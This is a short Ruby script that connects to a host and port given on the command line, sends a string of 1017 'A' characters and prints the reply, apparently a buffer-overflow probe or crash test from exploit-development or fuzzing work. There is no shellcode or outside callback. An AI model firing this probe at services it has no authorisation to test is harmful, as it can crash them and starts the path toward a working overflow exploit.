require 'socket'

ip = ARGV[0]
port = ARGV[1].to_i
payload = ("A" * 1017)

sock = TCPSocket.new(ip, port)
sock.write(payload)
resp = sock.gets()

puts resp
